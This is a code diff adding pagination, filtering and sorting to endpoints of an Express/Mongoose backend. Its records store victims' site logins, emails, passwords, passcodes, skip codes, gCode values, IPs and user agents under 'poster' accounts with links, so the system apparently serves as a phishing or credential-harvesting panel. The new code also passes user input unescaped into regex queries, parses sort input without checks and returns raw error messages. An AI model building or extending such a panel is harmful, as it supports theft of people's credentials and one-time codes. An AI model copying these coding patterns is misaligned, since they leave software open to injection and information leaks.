@@ -726,43 +726,104 @@ export const link_get = async (req, res) => {
 
 export const all_poster = async (req, res) => {
   const { id } = req.params;
+  const page = parseInt(req.query.page) || 1;
+  const pageSize = parseInt(req.query.pageSize) || 20;
+  const filter = req.query.filter || '';
+  const sortBy = req.query.sortBy ? JSON.parse(req.query.sortBy) : [];
 
   try {
     const user = await User.findOne({ _id: id });
 
-    const posters = await Poster.find({ root: id })
-      .select('username password links posterId createdAt')
-      .sort({ createdAt: -1 });
-    // .populate({
-    //     path: 'posters',
-    //     model: 'Poster',
-    //     select: 'username password links posterId createdAt',
+    let query = { root: id };
+    if (filter) {
+      query.$or = [
+        { username: { $regex: filter, $options: 'i' } },
+        { posterId: { $regex: filter, $options: 'i' } },
+      ];
+    }
 
-    // }).sort({ createdAt: -1 })
-    return res.status(200).json({ data: { ...user, posters: posters } });
+    let sort = { createdAt: -1 };
+    if (sortBy.length > 0) {
+      sort = {};
+      sortBy.forEach((s) => {
+        sort[s.id] = s.desc ? -1 : 1;
+      });
+    }
+
+    const total = await Poster.countDocuments(query);
+    const posters = await Poster.find(query)
+      .select('username password links posterId createdAt')
+      .sort(sort)
+      .skip((page - 1) * pageSize)
+      .limit(pageSize)
+      .lean();
+
+    return res.status(200).json({
+      data: {
+        ...user?.toObject(),
+        posters: posters,
+        total: total,
+        page: page,
+        pageSize: pageSize,
+        totalPages: Math.ceil(total / pageSize),
+      },
+    });
   } catch (e) {
-    res.status(400).json({ e: 'error' });
+    return res.status(400).json({ error: e.message });
   }
 };
 
 export const poster_details = async (req, res) => {
   const { id } = req.params;
+  const page = parseInt(req.query.page) || 1;
+  const pageSize = parseInt(req.query.pageSize) || 20;
+  const filter = req.query.filter || '';
+  const sortBy = req.query.sortBy ? JSON.parse(req.query.sortBy) : [];
 
   try {
     const poster = await Poster.findOne({ _id: id })
       .select('username password posterId links createdAt tag root')
       .populate('root', 'username adminId');
 
-    const details = await Info.find({ root: id })
+    let query = { root: id };
+    if (filter) {
+      query.$or = [
+        { site: { $regex: filter, $options: 'i' } },
+        { email: { $regex: filter, $options: 'i' } },
+        { mail: { $regex: filter, $options: 'i' } },
+      ];
+    }
+
+    let sort = { createdAt: -1 };
+    if (sortBy.length > 0) {
+      sort = {};
+      sortBy.forEach((s) => {
+        sort[s.id] = s.desc ? -1 : 1;
+      });
+    }
+
+    const total = await Info.countDocuments(query);
+    const details = await Info.find(query)
       .select(
         'site mail passcode skipcode email password tag gCode ip agent status number createdAt amount '
       )
-      .sort({ createdAt: -1 });
-    // const newdata = {...poster, details: details }
-    // console.log(newdata)
-    return res.status(200).json({ data: { ...poster, details: details } });
+      .sort(sort)
+      .skip((page - 1) * pageSize)
+      .limit(pageSize)
+      .lean();
+
+    return res.status(200).json({
+      data: {
+        ...poster?.toObject(),
+        details: details,
+        total: total,
+        page: page,
+        pageSize: pageSize,
+        totalPages: Math.ceil(total / pageSize),
+      },
+    });
   } catch (e) {
-    res.status(400).json({ e: 'error' });
+    return res.status(400).json({ error: e.message });
   }
 };
 
@@ -791,7 +852,6 @@ export const link_details = async (req, res) => {
   const pageSize = parseInt(req.query.pageSize) || 20;
   const filter = req.query.filter || '';
   const sortBy = req.query.sortBy ? JSON.parse(req.query.sortBy) : [];
-  // return res.status(200).json({ data: id, sites: admin })
 
   try {
     const sites = await Site.find();
@@ -800,18 +860,41 @@ export const link_details = async (req, res) => {
       const posters = await Poster.find({ root: id });
       const posterIds = posters.map((p) => p._id);
 
-      const links = await Link.find({ root: { $in: posterIds } });
+      let query = { root: { $in: posterIds } };
+      if (filter) {
+        query.linkName = { $regex: filter, $options: 'i' };
+      }
+
+      let sort = { createdAt: -1 };
+      if (sortBy.length > 0) {
+        sort = {};
+        sortBy.forEach((s) => {
+          sort[s.id] = s.desc ? -1 : 1;
+        });
+      }
+
+      const total = await Link.countDocuments(query);
+      const links = await Link.find(query)
+        .sort(sort)
+        .skip((page - 1) * pageSize)
+        .limit(pageSize);
+
       const linkNames = links.map((l) => l.linkName);
 
-      return res.status(200).json({ data: linkNames, sites: sites });
+      return res.status(200).json({ data: linkNames, sites: sites, total: total });
     } else if (admin == 0) {
-      // return res.status(200).json({ data: id, sites: admin })
-
       const data = await Poster.findOne({ _id: id });
-      return res.status(200).json({ data: data.links, sites: sites });
+      const allLinks = data?.links || [];
+      const filteredLinks = filter
+        ? allLinks.filter((l) => l.toLowerCase().includes(filter.toLowerCase()))
+        : allLinks;
+      const total = filteredLinks.length;
+      const paginated = filteredLinks.slice((page - 1) * pageSize, page * pageSize);
+
+      return res.status(200).json({ data: paginated, sites: sites, total: total });
     }
   } catch (e) {
-    res.status(400).json({ e: 'error' });
+    return res.status(400).json({ error: e.message });
   }
 };
 
@@ -2095,6 +2178,10 @@ export const get_amount_summary = async (req, res) => {
 
 export const get_amount_list = async (req, res) => {
   const { id } = req.params;
+  const page = parseInt(req.query.page) || 1;
+  const pageSize = parseInt(req.query.pageSize) || 20;
+  const filter = req.query.filter || '';
+  const sortBy = req.query.sortBy ? JSON.parse(req.query.sortBy) : [];
 
   try {
     const posterFound = await Poster.findOne({
@@ -2121,14 +2208,40 @@ export const get_amount_list = async (req, res) => {
       query = { adminId: userFound.adminId };
     }
 
+    if (filter) {
+      query.$or = [
+        { site: { $regex: filter, $options: 'i' } },
+        { email: { $regex: filter, $options: 'i' } },
+        { amount: { $regex: filter, $options: 'i' } },
+      ];
+    }
+
+    let sort = { createdAt: -1 };
+    if (sortBy.length > 0) {
+      sort = {};
+      sortBy.forEach((s) => {
+        sort[s.id] = s.desc ? -1 : 1;
+      });
+    }
+
+    const total = await Info.countDocuments(query);
     const infos = await Info.find(query)
       .select(
         'site email amount createdAt adminId poster root status lightningInvoice rHash'
       )
       .populate('root', 'username')
-      .sort({ createdAt: -1 });
+      .sort(sort)
+      .skip((page - 1) * pageSize)
+      .limit(pageSize);
 
-    return res.status(200).json({ success: true, data: infos });
+    return res.status(200).json({
+      success: true,
+      data: infos,
+      total,
+      page,
+      pageSize,
+      totalPages: Math.ceil(total / pageSize),
+    });
   } catch (e) {
     return res.status(400).json({ error: e.message });
   }
